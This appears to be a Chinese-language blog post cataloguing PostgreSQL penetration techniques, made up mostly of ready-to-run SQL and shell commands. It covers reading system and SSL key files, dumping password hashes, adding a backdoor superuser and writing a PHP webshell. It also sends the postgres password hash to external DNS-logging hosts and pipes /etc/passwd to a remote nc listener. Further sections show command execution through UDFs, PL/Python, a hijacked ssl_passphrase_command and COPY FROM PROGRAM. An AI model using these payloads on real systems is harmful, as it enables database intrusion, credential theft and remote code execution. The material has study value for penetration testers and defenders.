Postgresql 数据库作为 python 应用中比较常见的数据库，其利用手段公开的不多，我搜集了国内外一些相关的利用思路进行总结，如有遗漏还请指正。

---

# 信息收集

**查看服务器端版本**

```sql
-- 详细信息
select version();

-- 版本信息
show server_version;
select pg_read_file('PG_VERSION', 0, 200);

-- 数字版本信息包括小版号
SHOW server_version_num;
SELECT current_setting('server_version_num');
```

![](https://raw.githubusercontent.com/No-Github/pages/master/content/img/postgresql-pentest/5.png)

![](https://raw.githubusercontent.com/No-Github/pages/master/content/img/postgresql-pentest/6.png)

**列目录**

```sql
-- 注意: 在早期的 PostgreSQL 版本中,pg_ls_dir 不允许使用绝对路径
select pg_ls_dir('/etc');

-- 获取 pgsql 安装目录
select setting from pg_settings where name = 'data_directory';

-- 查找 pgsql 配置文件路径
select setting from pg_settings where name='config_file'
```

![](https://raw.githubusercontent.com/No-Github/pages/master/content/img/postgresql-pentest/13.png)

![](https://raw.githubusercontent.com/No-Github/pages/master/content/img/postgresql-pentest/30.png)

**列出数据库**

```sql
SELECT datname FROM pg_database;
```

![](https://raw.githubusercontent.com/No-Github/pages/master/content/img/postgresql-pentest/14.png)

**查看支持的语言**

```sql
select * from pg_language;
```

![](https://raw.githubusercontent.com/No-Github/pages/master/content/img/postgresql-pentest/22.png)

**查看安装的扩展**

```sql
select * from pg_available_extensions;
```

![](https://raw.githubusercontent.com/No-Github/pages/master/content/img/postgresql-pentest/23.png)

**查看服务器ip地址**

```sql
-- 这里是运行在 docker 里的靶机,所以 ip 不一致
select inet_server_addr()
```

![](https://raw.githubusercontent.com/No-Github/pages/master/content/img/postgresql-pentest/38.png)

---

# 账号操作

**查看当前用户是不是管理员权限**

```sql
SELECT current_setting('is_superuser');
-- on 代表是, off 代表不是

SHOW is_superuser;
SELECT usesuper FROM pg_user WHERE usename = CURRENT_USER;
```

**查询密码**

```sql
SELECT usename, passwd FROM pg_shadow;
```

![](https://raw.githubusercontent.com/No-Github/pages/master/content/img/postgresql-pentest/7.png)

```sql
SELECT rolname,rolpassword FROM pg_authid;
```

![](https://raw.githubusercontent.com/No-Github/pages/master/content/img/postgresql-pentest/19.png)

可以看到,目前查询到的用户 hash 已经是 scram-sha-256,在以前的版本是加盐md5

我们可以查询当前的加密方式
```sql
-- password_encryption参数决定了密码怎么被hash
SELECT name,setting,source,enumvals FROM pg_settings WHERE name = 'password_encryption';
```

![](https://raw.githubusercontent.com/No-Github/pages/master/content/img/postgresql-pentest/20.png)

**添加用户**

```sql
--创建 f0x，赋予角色属性
create user f0x password 'Abcd1234' superuser createrole createdb
--添加 f0x 到角色组
grant postgres to f0x
```

**修改一个角色为管理员角色**

```sql
alter role f0x createrole;
```

**更改密码**

```sql
ALTER USER user_name WITH PASSWORD 'new_password';
```

**查看用户**

```sql
SELECT user;
SELECT current_user;
SELECT session_user;
SELECT usename FROM pg_user;
SELECT getpgusername();
```

**查看管理员用户**

```sql
SELECT usename FROM pg_user WHERE usesuper IS TRUE
```

**获取用户角色**

```sql
SELECT
      r.rolname,
      r.rolsuper,
      r.rolinherit,
      r.rolcreaterole,
      r.rolcreatedb,
      r.rolcanlogin,
      r.rolconnlimit, r.rolvaliduntil,
  ARRAY(SELECT b.rolname
        FROM pg_catalog.pg_auth_members m
        JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
        WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;
```

![](https://raw.githubusercontent.com/No-Github/pages/master/content/img/postgresql-pentest/18.png)

---

# PostgreSQL 读文件

**方法1 pg_read_file**

```sql
-- 注意: 在早期的 PostgreSQL 版本中,pg_read_file 不允许使用绝对路径
select pg_read_file('/etc/passwd');

-- 单引号被转义的情况下使用
select/**/PG_READ_FILE($$/etc/passwd$$)
```

![](https://raw.githubusercontent.com/No-Github/pages/master/content/img/postgresql-pentest/15.png)

**方法2**

```sql
create table testf0x(t TEXT);
copy testf0x from '/etc/passwd';
select * from testf0x limit 1 offset 0;
```

![](https://raw.githubusercontent.com/No-Github/pages/master/content/img/postgresql-pentest/8.png)

**方法3 lo_import**

lo_import 允许指定文件系统路径。该文件将被读取并加载到一个大对象中，并返回该对象的 OID。

```sql
Select lo_import('/etc/passwd',12345678);
select array_agg(b)::text::int from(select encode(data,'hex')b,pageno from pg_largeobject where loid=12345678 order by pageno)a

-- 单引号被转义的情况下使用
select/**/lo_import($$/etc/passwd$$,11111);
select/**/cast(encode(data,$$base64$$)as/**/integer)/**/from/**/pg_largeobject/**/where/**/loid=11111
```

![](https://raw.githubusercontent.com/No-Github/pages/master/content/img/postgresql-pentest/9.png)

![](https://raw.githubusercontent.com/No-Github/pages/master/content/img/postgresql-pentest/10.png)

---

# PostgreSQL 写文件

**利用条件**
- 拥有网站路径写入权限
- 知道网站绝对路径

**方法1 COPY**

COPY 命令可以用于表和文件之间交换数据，这里可以用它写 webshell

```sql
COPY (select '<?php phpinfo();?>') to '/tmp/1.php';
```

![](https://raw.githubusercontent.com/No-Github/pages/master/content/img/postgresql-pentest/1.png)

![](https://raw.githubusercontent.com/No-Github/pages/master/content/img/postgresql-pentest/2.png)

也可以 base64 一下
```sql
COPY (select convert_from(decode('ZmZmZmZmZmYweA==','base64'),'utf-8')) to '/tmp/success.txt';
```

![](https://raw.githubusercontent.com/No-Github/pages/master/content/img/postgresql-pentest/16.png)

![](https://raw.githubusercontent.com/No-Github/pages/master/content/img/postgresql-pentest/17.png)

**方法2 lo_export**

lo_export 采用大对象 OID 和路径，将文件写入路径。

```sql
select lo_from_bytea(12349,'ffffffff0x');
SELECT lo_export(12349, '/tmp/ffffffff0x.txt');

-- base64 的形式
select lo_from_bytea(12350,decode('ZmZmZmZmZmYweA==','base64'));
SELECT lo_export(12350, '/tmp/ffffffff0x.txt');
```

![](https://raw.githubusercontent.com/No-Github/pages/master/content/img/postgresql-pentest/36.png)

![](https://raw.githubusercontent.com/No-Github/pages/master/content/img/postgresql-pentest/37.png)

**方法3 lo_export + pg_largeobject**

```sql
-- 记下生成的lo_creat ID
select lo_creat(-1);

-- 替换 24577 为生成的lo_creat ID
INSERT INTO pg_largeobject(loid, pageno, data) values (24577, 0, decode('ZmZmZmZmZmYweA==', 'base64'));
select lo_export(24577, '/tmp/success.txt');
```

![](https://raw.githubusercontent.com/No-Github/pages/master/content/img/postgresql-pentest/31.png)

![](https://raw.githubusercontent.com/No-Github/pages/master/content/img/postgresql-pentest/32.png)

![](https://raw.githubusercontent.com/No-Github/pages/master/content/img/postgresql-pentest/33.png)

如果内容过多，那么首先创建一个 OID 作为写入的对象, 然后通过 0,1,2,3… 分片上传但是对象都为 12345 最后导出到 /tmp 目录下, 收尾删除 OID

写的文件每一页不能超过 2KB，所以我们要把数据分段，这里我就不拿 .so 文件为例了,就随便写个 txt 举个例子

```sql
SELECT lo_create(12345);
INSERT INTO pg_largeobject VALUES (12345, 0, decode('6666', 'hex'));
INSERT INTO pg_largeobject VALUES (12345, 1, decode('666666', 'hex'));
INSERT INTO pg_largeobject VALUES (12345, 2, decode('6666', 'hex'));
INSERT INTO pg_largeobject VALUES (12345, 3, decode('663078', 'hex'));
SELECT lo_export(12345, '/tmp/ffffffff0x.txt');
SELECT lo_unlink(12345);
```

![](https://raw.githubusercontent.com/No-Github/pages/master/content/img/postgresql-pentest/11.png)

![](https://raw.githubusercontent.com/No-Github/pages/master/content/img/postgresql-pentest/12.png)

或者还可以用 lo_put 在后面拼接进行写入

```sql
select lo_create(11116);
select lo_put(11116,0,'dGVzdDEyM');
select lo_put(11116,9,'zQ1Ng==');

select lo_from_bytea(11141,decode(encode(lo_get(11116),'escape'),'base64'));
select lo_export(11141,'/tmp/test.txt');
SELECT lo_unlink(11141);
```

![](https://raw.githubusercontent.com/No-Github/pages/master/content/img/postgresql-pentest/45.png)

![](https://raw.githubusercontent.com/No-Github/pages/master/content/img/postgresql-pentest/46.png)

![](https://raw.githubusercontent.com/No-Github/pages/master/content/img/postgresql-pentest/47.png)

结束记得清理 OID 内容
```sql
-- 查看创建的 lo_creat ID
select * from pg_largeobject

-- 使用 lo_unlink 进行删除
SELECT lo_unlink(12345);
```

---

# PostgreSQL 创建文件夹

## 通过 log_directory 创建文件夹

方法来自于 https://www.yulegeyu.com/2020/11/16/Postgresql-Superuser-SQL%E6%B3%A8%E5%85%A5-RCE%E4%B9%8B%E6%97%85/ 这篇文章的场景

**利用条件**
- 目标已经配置了 `logging_collector = on`

**描述**

配置文件中的 log_directory 配置的目录不存在时，pgsql 启动会失败，但是如果日志服务已启动,在修改 log_directory 配置后再 reload_conf 目录会被创建

**原理**

logging_collector 配置是否开启日志，只能在服务开启时配置，reloadconf 无法修改,log_directory 用来配置 log 日志文件存储到哪个目录，如果 log_directory 配置到一个不存在的目录,pgsql 会创建目录。

**测试**

拿靶机中的 postgresql 为例，先查看配置文件的路径
```bash
select setting from pg_settings where name='config_file'
```

![](https://raw.githubusercontent.com/No-Github/pages/master/content/img/postgresql-pentest/39.png)

查看内容
```bash
select pg_read_file('/var/lib/postgresql/data/postgresql.conf');
```

将配置文件中的 log_directory 配置修改
```
log_destination = 'csvlog'
log_directory = '/tmp/f0x'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
log_rotation_size = 100MB
log_rotation_age = 1d
log_min_messages = INFO
logging_collector = on
```

转为 base64 格式
```bash
# 这里我将配置文件的内容存到了 out.txt 中
cat out.txt | base64 -w 0 > base64.txt
```

```sql
-- 将修改后的配置文件加载到largeobject中
select lo_from_bytea(10001,decode('base64的内容,这里略','base64'));

-- 通过lo_export覆盖配置文件
select lo_export(10001,'/var/lib/postgresql/data/postgresql.conf');
SELECT lo_unlink(10001);

-- 重新加载配置文件
select pg_reload_conf();
```

![](https://raw.githubusercontent.com/No-Github/pages/master/content/img/postgresql-pentest/40.png)

![](https://raw.githubusercontent.com/No-Github/pages/master/content/img/postgresql-pentest/41.png)

![](https://raw.githubusercontent.com/No-Github/pages/master/content/img/postgresql-pentest/42.png)

```sql
-- 查询一下修改是否成功
select name,setting,short_desc from pg_settings where name like 'log_%';
```

![](https://raw.githubusercontent.com/No-Github/pages/master/content/img/postgresql-pentest/43.png)

进入靶机,可以看到 f0x 目录已经创建

![](https://raw.githubusercontent.com/No-Github/pages/master/content/img/postgresql-pentest/44.png)

---

# PostgreSQL 带外数据

```sql
-- 开启 dblink 扩展
CREATE EXTENSION dblink

-- 获取当前数据库用户名称
SELECT * FROM dblink('host='||(select user)||'.djw0pg.dnslog.cn user=test dbname=test', 'SELECT version()') RETURNS (result TEXT);
```

![](https://raw.githubusercontent.com/No-Github/pages/master/content/img/postgresql-pentest/21.png)

```sql
-- 查询当前密码
SELECT * FROM dblink('host='||(SELECT passwd FROM pg_shadow WHERE usename='postgres')||'.c8jrsjp2vtc0000rwce0grjcc3oyyyyyb.interact.sh user=test dbname=test', 'SELECT version()') RETURNS (result TEXT);
```

![](https://raw.githubusercontent.com/No-Github/pages/master/content/img/postgresql-pentest/34.png)

```sql
-- nc 监听
nc -lvv 4444

select dblink_connect((select 'hostaddr=x.x.x.x port=4445 user=test password=test sslmode=disable dbname='||(SELECT passwd FROM pg_shadow WHERE usename='postgres')));
```

![](https://raw.githubusercontent.com/No-Github/pages/master/content/img/postgresql-pentest/35.png)

---

# PostgreSQL 提权

## 利用 UDF 命令执行

在 8.2 以前,postgresql 不验证 magic block,可以直接调用本地的 libc.so
```sql
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
SELECT system('cat /etc/passwd | nc xxx.xx.xx.xx');
```

8.2 以上版本,需要自己编译 so 文件去创建执行命令函数，可以自己编译反弹 shell 后门，也可以用 sqlmap 提供好的
- https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/postgresql

可以参考 [No-Github/postgresql_udf_help](https://github.com/No-Github/postgresql_udf_help)

```bash
# 找相应的 dev 扩展包
apt-get search postgresql-server-dev
# 安装 dev 扩展包
apt-get install postgresql-server-dev-11
# apt install postgresql-server-dev-all

# 编译好 .so 文件
git clone https://github.com/No-Github/postgresql_udf_help
cd postgresql_udf_help
gcc -Wall -I/usr/include/postgresql/11/server -Os -shared lib_postgresqludf_sys.c -fPIC -o lib_postgresqludf_sys.so
strip -sx lib_postgresqludf_sys.so

# 生成分片后的 sql 语句
cat lib_postgresqludf_sys.so | xxd -ps | tr -d "\n" > 1.txt
python2 postgresql_udf_help.py 1.txt > sqlcmd.txt
```

![](https://raw.githubusercontent.com/No-Github/pages/master/content/img/postgresql-pentest/4.png)

## PL/Python 扩展

PostgreSQL 可以支持多种存储过程语言，官方支持的除了 PL/pgSQL，还有 TCL，Perl，Python 等。

默认 PostgreSQL 不会安装 Python 的扩展,这里我手动在靶机上安装下进行复现
```sql
select version();
```

先看下版本, pg 14

![](https://raw.githubusercontent.com/No-Github/pages/master/content/img/postgresql-pentest/24.png)

搜索下有没有对应的 plpython3u 版本安装

```bash
apt search postgresql-plpython
```

![](https://raw.githubusercontent.com/No-Github/pages/master/content/img/postgresql-pentest/25.png)

有,那么直接装

```bash
apt install postgresql-plpython-14
```

安装完毕后记得注册下扩展

```sql
create extension plpython3u;
```

![](https://raw.githubusercontent.com/No-Github/pages/master/content/img/postgresql-pentest/26.png)

查看是否支持 plpython3u

```
select * from pg_language;
```

![](https://raw.githubusercontent.com/No-Github/pages/master/content/img/postgresql-pentest/27.png)

创建一个 UDF 来执行我们要执行的命令

```sql
CREATE FUNCTION system (a text)
  RETURNS text
AS $$
  import os
  return os.popen(a).read()
$$ LANGUAGE plpython3u;
```

![](https://raw.githubusercontent.com/No-Github/pages/master/content/img/postgresql-pentest/28.png)

创建好 UDF 后，进行调用
```sql
select system('ls -la');
```

![](https://raw.githubusercontent.com/No-Github/pages/master/content/img/postgresql-pentest/29.png)

## 利用 session_preload_libraries 加载共享库

方法来自于 https://www.yulegeyu.com/2020/11/16/Postgresql-Superuser-SQL%E6%B3%A8%E5%85%A5-RCE%E4%B9%8B%E6%97%85/ 这篇文章的场景

**描述**

session_preload_libraries 只允许 superuser 修改，但可以加载任意目录的库，session_preload_libraries 配置从 pg10 开始存在，低于 pg10 时，可以使用 local_preload_libraries，不过该配置只允许加载 $libdir/plugins/ 目录下的库，需要将库写入到该目录下。

当每次有新连接进来时，都会加载 session_preload_libraries 配置的共享库。

和上面的利用 UDF 命令执行一样，不过不同点在于上面一个是创建 function 加载,这个方式是通过改配置文件中的 session_preload_libraries 进行加载，这里就不复现了

## 利用 ssl_passphrase_command 执行命令

方法来自于 https://pulsesecurity.co.nz/articles/postgres-sqli 这篇文章的场景

**利用条件**
- 需要知道 PG_VERSION 文件的位置 (不是 PG_VERSION 文件也行,pgsql限制私钥文件权限必须是0600才能够加载，pgsql目录下的所有0600权限的文件都是可以的,但覆盖后没啥影响的就 PG_VERSION 了)

**描述**

当配置文件中配置了 ssl_passphrase_command ，那么该配置在需要获取用于解密SSL文件密码时会调用该配置的命令。

通过上传 pem，key 到目标服务器上，读取配置文件内容，修改配置文件中的ssl配置改为我们要执行的命令，通过lo_export覆盖配置文件，最后通过 pg_reload_conf 重载配置文件时将执行命令

**复现**

这里以靶机上已经存在的2个密钥文件为例
```
/etc/ssl/certs/ssl-cert-snakeoil.pem
/etc/ssl/private/ssl-cert-snakeoil.key
```

通过文件读取获取私钥

```sql
select pg_read_file('/etc/ssl/private/ssl-cert-snakeoil.key');
```

对私钥文件加密
```bash
# 密码为 12345678
openssl rsa -aes256 -in ssl-cert-snakeoil.key -out private_passphrase.key

# 输出为 base64 格式
cat private_passphrase.key | base64 -w 0 > base.txt
```

上传 private_passphrase.key 到目标服务器上

由于 pgsql 限制私钥文件权限必须是 0600 才能够加载，这里搜索 pgsql 目录下的所有 0600 权限的文件,发现 PG_VERSION 文件符合条件，而且覆盖也没有太大影响

PG_VERSION 与 config_file 文件同目录，上传私钥文件覆盖 PG_VERSION，可绕过权限问题。
```sql
-- 将 private_passphrase.key 覆盖 PG_VERSION 文件
select lo_from_bytea(10004,decode('base64的内容,这里略','base64'));
select lo_export(10004,'/var/lib/postgresql/data/PG_VERSION');
SELECT lo_unlink(10004);
```

在靶机中查看验证是否写入成功

![](https://raw.githubusercontent.com/No-Github/pages/master/content/img/postgresql-pentest/49.png)

读取配置文件内容

```
select setting from pg_settings where name='config_file'
select pg_read_file('/var/lib/postgresql/data/postgresql.conf');
```

在原始配置文件内容末尾追加上ssl配置

```
ssl = on
ssl_cert_file = '/etc/ssl/certs/ssl-cert-snakeoil.pem'
ssl_key_file = '/var/lib/postgresql/data/PG_VERSION'
ssl_passphrase_command_supports_reload = on
ssl_passphrase_command = 'bash -c "touch /tmp/success & echo 12345678; exit 0"'
```

转为 base64 格式
```bash
# 这里我将配置文件的内容存到了 out.txt 中
cat out.txt | base64 -w 0 > base3.txt
```

```sql
-- 将修改后的配置文件加载到largeobject中
select lo_from_bytea(10001,decode('base64的内容,这里略','base64'));

-- 通过lo_export覆盖配置文件
select lo_export(10001,'/var/lib/postgresql/data/postgresql.conf');
SELECT lo_unlink(10001);

-- 重新加载配置文件
select pg_reload_conf();
```

![](https://raw.githubusercontent.com/No-Github/pages/master/content/img/postgresql-pentest/50.png)

可以看到,重新加载配置文件后,ssl_passphrase_command 中的命令已经执行

![](https://raw.githubusercontent.com/No-Github/pages/master/content/img/postgresql-pentest/48.png)

## CVE-2018-1058 PostgreSQL 提权漏洞

PostgreSQL 其 9.3 到 10 版本中存在一个逻辑错误，导致超级用户在不知情的情况下触发普通用户创建的恶意代码，导致执行一些不可预期的操作。

详细复现可以参考 vulhub 靶场中的 writeup
- https://vulhub.org/#/environments/postgres/CVE-2018-1058/

## CVE-2019-9193 PostgreSQL 高权限命令执行漏洞

**描述**

PostgreSQL 其 9.3 到 11 版本中存在一处“特性”，管理员或具有“COPY TO/FROM PROGRAM”权限的用户，可以使用这个特性执行任意命令。

**利用条件**
- 版本9.3-11.2
- 超级用户或者pg_read_server_files组中的任何用户

**相关文章**
- [Authenticated Arbitrary Command Execution on PostgreSQL 9.3 > Latest](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5)

**POC | Payload | exp**
```sql
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
```

![](https://raw.githubusercontent.com/No-Github/pages/master/content/img/postgresql-pentest/3.png)

---

# 参考
- [渗透中利用postgresql getshell](https://jianfensec.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E4%B8%AD%E5%88%A9%E7%94%A8postgresql%20getshell/)
- https://github.com/safe6Sec/PentestDB/blob/master/PostgreSQL.md
- https://github.com/nixawk/pentest-wiki/blob/master/2.Vulnerability-Assessment/Database-Assessment/postgresql/postgresql_hacking.md
- [A Penetration Tester’s Guide to PostgreSQL by David Hayter](https://hakin9.org/a-penetration-testers-guide-to-postgresql/)
- [Hacking PostgreSQL](https://tttang.com/archive/854/)
- [PL/Python安装和使用](https://valleylord.github.io/post/201410-postgres-plpython-install/)
- [PostgreSQL for red teams](https://www.unix-ninja.com/p/postgresql_for_red_teams)
- [SQL INJECTION AND POSTGRES - AN ADVENTURE TO EVENTUAL RCE](https://pulsesecurity.co.nz/articles/postgres-sqli)
- https://book.hacktricks.xyz/pentesting/pentesting-postgresql
- https://github.com/nixawk/pentest-wiki/blob/master/2.Vulnerability-Assessment/Database-Assessment/postgresql/postgresql_hacking.md
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md
- [数据库：从注入到提权的全家桶套餐](https://www.freebuf.com/articles/database/270106.html)
- [实战案例：针对某系统postgresql注入](https://mp.weixin.qq.com/s/I5hDjIEzn0rKA9aCZsJw9w)
- [记一次pgsql数据库漏洞利用](https://xz.aliyun.com/t/10202)
- [Postgresql Superuser SQL注入 RCE之旅](https://www.yulegeyu.com/2020/11/16/Postgresql-Superuser-SQL%E6%B3%A8%E5%85%A5-RCE%E4%B9%8B%E6%97%85/)